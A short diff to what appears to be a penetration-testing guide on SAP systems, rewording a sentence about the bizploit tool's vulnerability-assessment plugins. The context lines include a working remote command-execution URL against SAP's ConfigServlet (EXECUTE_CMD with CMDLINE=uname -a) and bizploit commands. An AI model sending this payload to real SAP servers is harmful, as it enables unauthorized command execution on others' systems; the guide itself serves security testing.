@@ -170,7 +170,7 @@ Matching Modules
 ```
 http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
 ```
-- Before running the ```start``` command on the bizploit script on the Discovery phase, you can also add the following for performing vulnerability assessment after discovering some endpoints (from davehardy):
+- Before running the ```start``` command on the bizploit script at the Discovery phase, you can also add the following for performing vulnerability assessment:
 ```
 bizploit> plugins
 bizploit/plugins> vulnassess all
